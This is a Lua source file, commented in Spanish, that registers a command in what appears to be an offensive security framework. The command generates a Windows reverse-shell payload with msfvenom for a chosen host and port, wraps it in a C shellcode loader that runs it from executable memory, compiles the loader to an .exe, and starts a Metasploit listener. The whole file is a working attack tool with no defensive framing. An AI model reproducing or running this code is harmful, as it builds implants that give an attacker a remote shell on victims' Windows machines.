-- Función principal para generar el shellcode y el cargador para Windows
local function generate_msfvenom_loader_windows(lhost, lport)
    -- Funciones auxiliares definidas dentro del scope principal
    local function execute_command_to_file(command, output_file)
        os.execute(command .. " > " .. output_file)
    end

    local function read_file(file_path)
        local file = io.open(file_path, "r")
        if not file then
            return nil, "Error: Could not open file at " .. file_path
        end
        local content = file:read("*a")
        file:close()
        return content
    end

    local function hex_to_nasm(hex_string)
        -- Validar y limpiar la entrada hexadecimal
        local clean_hex = hex_string:gsub("%W", "")
        if #clean_hex % 2 ~= 0 then
            return nil, "Invalid hex string length (odd number of characters)"
        end

        -- Convertir a una lista de bytes
        local byte_list = {}
        for i = 1, #clean_hex, 2 do
            table.insert(byte_list, string.format("0x%s", clean_hex:sub(i, i+1)))
        end

        -- Generar el código C correctamente formateado
        local c_code = {
            "unsigned char shellcode[] = {"
        }

        -- Dividir en líneas de 16 bytes para mejor legibilidad
        for i = 1, #byte_list, 16 do
            local chunk_end = math.min(i + 15, #byte_list)
            local chunk = {}
            for j = i, chunk_end do
                table.insert(chunk, byte_list[j])
            end
            local chunk_str = table.concat(chunk, ", ")
            table.insert(c_code, "    " .. chunk_str .. ",")
        end

        -- Remover la última coma y cerrar el array
        if #c_code > 1 then
            local last_line = c_code[#c_code]
            c_code[#c_code] = last_line:sub(1, #last_line - 1)  -- Remover la coma final
        end
        
        table.insert(c_code, "};")
        table.insert(c_code, string.format("unsigned int shellcode_len = sizeof(shellcode);"))

        return table.concat(c_code, "\n"), nil
    end

    local function generate_loader_windows_c(hex_string)
        local shellcode_code, err = hex_to_nasm(hex_string)
        if not shellcode_code then
            return nil, err
        end

        -- Generar código C completo
        local c_code = [[
#include <windows.h>
#include <stdio.h>

]] .. shellcode_code .. [[

int main() {
    LPVOID memory = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (memory == NULL) return 1;
    
    memcpy(memory, shellcode, shellcode_len);
    ((void(*)())memory)();
    
    return 0;
}
]]

        -- Guardar el código C en un archivo
        local file_path = "sessions/loader_windows.c"
        local file = io.open(file_path, "w")
        if not file then
            return nil, "Error: Could not create file at " .. file_path
        end

        file:write(c_code)
        file:close()

        -- Compilar usando MinGW (versión de 32 bits)
        local compile_command = "i686-w64-mingw32-gcc -s -fno-asynchronous-unwind-tables " .. file_path .. " -o sessions/loader_windows.exe -lkernel32"
        
        local success = os.execute(compile_command)
        if success then
            return "Windows loader generated successfully with C. Binary saved at sessions/loader_windows.exe."
        else
            return "Error during C compilation."
        end
    end

    -- Validación de parámetros
    if not lhost or not lport then
        return "Error: lhost or lport not defined."
    end

    -- Archivo temporal para guardar la salida de msfvenom
    local temp_file = "sessions/msfvenom_output_windows.txt"

    -- Generar el shellcode con msfvenom para Windows (32 bits)
    local msfvenom_command = string.format(
        "msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f hex -b '\\x00'",
        lhost, lport
    )
    execute_command_to_file(msfvenom_command, temp_file)

    -- Leer el archivo temporal y extraer el shellcode hexadecimal
    local content, err = read_file(temp_file)
    if not content then
        return "Error: " .. err
    end

    local shellcode_hex = content:match("(%x+)")
    if not shellcode_hex then
        return "Error: Failed to extract shellcode from msfvenom output."
    end

    -- Generar el cargador usando la versión C
    local result, err = generate_loader_windows_c(shellcode_hex)
    if not result then
        return "Error: " .. err
    end
    
    print("Press 2 and enter to continue to metasploit listener")
    app.one_cmd("msf rev win")
    return result
end

-- Registrar el comando para Windows
register_command("generate_msfvenom_loader_windows", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]
    return generate_msfvenom_loader_windows(lhost, lport)
end)
